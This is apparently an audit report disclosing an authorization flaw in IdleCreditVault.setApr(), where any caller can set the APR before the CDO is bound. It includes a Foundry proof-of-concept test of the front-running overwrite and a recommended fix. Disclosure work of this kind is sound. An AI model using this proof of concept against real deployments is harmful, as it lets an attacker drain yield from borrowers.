### Title
Unauthenticated APR takeover before `idleCDO` binding lets an attacker inflate borrower-funded yield - (contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault.setApr()` enforces caller authorization only after `idleCDO` has been bound through `setWhitelistedCDO()`. While `idleCDO == address(0)`, any EOA can replace the configured scaled APR up to `maxApr`. In a non-atomic deployment sequence—strategy initialization, CDO initialization/configuration, then owner whitelisting—the attacker can front-run `setWhitelistedCDO()` and install a borrower-funded APR they do not control under the intended trust model.

`setAprs()` has the same issue because it writes `unscaledApr` before delegating authorization to `setApr()`. The factory deployment is atomic and avoids this window, but the deployed contracts themselves still expose the vulnerable pre-binding state for non-factory/manual deployment flows.

### Finding Description

`IdleCreditVault.setApr()` only checks `msg.sender == idleCDO || msg.sender == manager` when `idleCDO` is non-zero. The comment explicitly skips authentication during setup: [1](#0-0) 

```solidity
function setApr(uint256 _apr) public {
  address _cdo = idleCDO;

  // if cdo is not yet set we skip the check (this can happen only during the setup)
  if (_cdo != address(0)) {
    if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
  }
  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

The CDO is bound separately through owner-only `setWhitelistedCDO()`: [2](#0-1) 

```solidity
function setWhitelistedCDO(address _cdo) external onlyOwner {
  require(_cdo != address(0), "IS_0");
  idleCDO = _cdo;
}
```

Once the epoch starts, the CDO calculates `expectedEpochInterest` from the strategy APR and pulls that amount from the borrower at epoch stop: [3](#0-2) [4](#0-3) 

The resulting interest increases tranche NAV and is distributed through normal withdrawals. Therefore, an attacker who is also a permitted lender can deposit before the epoch and receive yield generated from an APR they installed without authorization.

### Impact Explanation

This is unauthorized alteration of a core economic parameter and can directly transfer value from the borrower to the attacker's tranche position.

For example, with the default `maxApr = 20e18`, a 30-day epoch, and the attacker's deposited principal `P`, an installed scaled APR of `10e18` can produce approximately:

```text
P * 10e18 * 30 days / (1e18 * 365 days)
= P * 82.19%
```

If the attacker is the only lender with `1,000,000` underlying deposited, the borrower can be charged roughly `821,918` underlying of attacker-influenced epoch interest. The attacker then exits through the normal epoch withdrawal path.

If the borrower cannot fund the inflated expected amount, the stop may instead enter the default path, causing a protocol solvency/loss event rather than legitimate credit performance.

### Likelihood Explanation

The attack requires a deployment/configuration flow where `setWhitelistedCDO()` is not executed atomically with strategy initialization and configuration. The factory currently performs configuration and binding in one transaction, so factory-created vaults are not exposed to this race: [5](#0-4) 

However, `IdleCreditVault.initialize()` leaves `idleCDO` unset, and the strategy can exist in that state until a later owner transaction binds the CDO: [6](#0-5)  Any public observer can call `setApr()` in that interval. KYC does not mitigate the issue because the attacker transaction targets the strategy directly and does not need to pass `isWalletAllowed()`.

### Recommendation

Remove the unauthenticated setup branch from `setApr()`:

```solidity
function setApr(uint256 _apr) public {
  address _cdo = idleCDO;
  if (_cdo == address(0)) revert NotAllowed();
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();

  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

Initialize `idleCDO` atomically during strategy initialization, or introduce a single privileged `configure()` function that sets both `idleCDO` and initial APR in one transaction. Additionally, make `setAprs()` and `setAprsWithBuffer()` perform explicit authorization before mutating `unscaledApr`; currently the authorization failure in `setApr()` reverts the whole transaction, but relying on nested authorization makes the setup bypass harder to audit.

### Proof of Concept

The following Foundry test demonstrates the authentication bypass. It uses separate strategy initialization/configuration and `setWhitelistedCDO()` transactions to model a manual deployment. The important assertion is that an arbitrary attacker changes the configured APR before the CDO binding exists.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVault} from
  "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from
  "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from
  "../contracts/interfaces/IERC20Detailed.sol";

contract IdleCreditVaultAprAuthBypassTest is Test {
  address owner = address(0xA11CE);
  address manager = address(0xA11CE);
  address borrower = address(0xB077);
  address attacker = address(0xBAD);

  IERC20Detailed underlying = IERC20Detailed(address(/* fork USDC */));

  function test_UnauthenticatedAprOverwriteBeforeCdoBinding() external {
    IdleCreditVault strategyImpl = new IdleCreditVault();
    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();

    // Initialize strategy. idleCDO remains address(0).
    IdleCreditVault strategy = IdleCreditVault(
      address(new TransparentUpgradeableProxy(
        address(strategyImpl),
        address(this),
        abi.encodeWithSelector(
          IdleCreditVault.initialize.selector,
          address(underlying),
          owner,
          manager,
          borrower,
          "Borrower",
          1e18 // intended APR
        )
      ))
    );

    // Deploy/configure CDO in a separate transaction.
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(
      address(new TransparentUpgradeableProxy(
        address(cdoImpl),
        address(this),
        abi.encodeWithSelector(
          IdleCDOEpochVariant.initialize.selector,
          0,
          address(underlying),
          owner,
          owner,
          address(0),
          address(strategy),
          100_000
        )
      ))
    );

    uint256 intendedApr = strategy.lastApr();
    assertLt(intendedApr, strategy.maxApr());

    // Attacker front-runs the owner's setWhitelistedCDO transaction.
    // No CDO or manager authentication is enforced while idleCDO == 0.
    vm.prank(attacker);
    strategy.setApr(strategy.maxApr());

    assertEq(strategy.lastApr(), strategy.maxApr());
    assertEq(strategy.idleCDO(), address(0));

    // Owner binds the CDO after the malicious APR was installed.
    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // The attacker-chosen APR is now protected by the normal CDO/manager check.
    vm.prank(attacker);
    vm.expectRevert();
    strategy.setApr(1e18);

    assertEq(strategy.idleCDO(), address(cdo));
    assertEq(strategy.lastApr(), strategy.maxApr());
  }
}
```

A full fork extension can deposit as a KYC-passing attacker, start a 30-day epoch, approve the borrower for `expectedEpochInterest`, call `stopEpoch()`, and then request/claim withdrawal. The borrower's paid epoch interest should equal the value derived from the attacker-installed `lastApr`, establishing direct theft rather than a mere configuration change.
